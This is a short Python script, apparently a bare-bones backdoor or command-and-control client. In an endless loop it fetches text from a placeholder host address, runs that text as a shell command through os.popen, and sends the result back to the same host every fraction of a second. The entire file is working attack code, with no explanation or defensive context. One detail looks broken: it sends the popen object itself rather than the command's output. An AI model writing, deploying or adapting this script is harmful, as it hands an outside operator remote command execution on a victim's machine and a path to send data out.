import requests
import os 
from time import sleep 
while True:
    r = requests.get("http://IP")
    output = os.popen(r.text, 'r', 1)
    payload = { 'q' : output }
    requests.get("http://IP/output", params=payload)
    sleep(.20)